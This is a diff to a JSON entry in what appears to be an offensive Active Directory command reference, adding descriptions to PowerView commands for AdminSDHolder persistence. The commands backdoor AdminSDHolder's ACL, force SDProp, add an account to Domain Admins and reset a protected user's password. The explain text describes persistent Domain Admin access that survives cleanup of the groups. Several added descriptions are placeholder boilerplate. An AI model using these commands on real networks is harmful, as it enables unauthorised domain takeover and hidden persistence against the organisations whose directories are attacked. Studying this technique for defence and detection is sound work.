@@ -190,23 +190,28 @@
   "variations": [
     {
       "label": "Trigger SDProp immediately",
-      "command": "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose"
+      "command": "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose",
+      "description": "Trigger SDProp immediately. See the command syntax for exact parameters and flags."
     },
     {
       "label": "Grant ResetPassword/WriteMembers on AdminSDHolder",
-      "command": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights WriteMembers -Verbose"
+      "command": "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>' -PrincipalIdentity <user> -Rights WriteMembers -Verbose",
+      "description": "Adds an Access Control Entry (ACE) to a domain object using PowerView. Used to grant yourself or a controlled account additional permissions on the target object for privilege escalation."
     },
     {
       "label": "AD Module - Set-DCPermissions (AdminSDHolder)",
-      "command": "Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -DistinguishedName 'CN=<user>,CN=Users,DC=<domain>' -Verbose"
+      "command": "Set-DCPermissions -Method AdminSDHolder -SAMAccountName <user> -DistinguishedName 'CN=<user>,CN=Users,DC=<domain>' -Verbose",
+      "description": "AD Module - Set-DCPermissions (AdminSDHolder). See the command syntax for exact parameters and flags."
     },
     {
       "label": "Abuse - add self to Domain Admins",
-      "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> -Verbose"
+      "command": "Add-DomainGroupMember -Identity 'Domain Admins' -Members <user> -Verbose",
+      "description": "Adds a user to a domain group using PowerView. If you have write access to a privileged group (e.g., via GenericAll or GenericWrite ACL), you can add yourself or a controlled account to escalate privileges."
     },
     {
       "label": "Abuse - reset a protected user's password",
-      "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose"
+      "command": "Set-DomainUserPassword -Identity <target_account> -AccountPassword (ConvertTo-SecureString '<new_password>' -AsPlainText -Force) -Verbose",
+      "description": "Abuse - reset a protected user's password. See the command syntax for exact parameters and flags."
     }
   ],
   "explain": "Backdoors AdminSDHolder so its ACL propagates to every protected group via SDProp:\n  Add-DomainObjectAcl       write an ACE\n  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<domain>,DC=local'   the template object whose DACL SDProp copies out\n  -PrincipalIdentity '<user>'   the account you control\n  -Rights All              GenericAll (or WriteMembers/ResetPassword)\nEvery ~60 min SDProp stamps this ACL onto Domain Admins/Enterprise Admins/Administrators, so <user> can re-grant itself DA - persistent even after cleanup of the groups themselves. Invoke-SDPropagator forces it immediately."
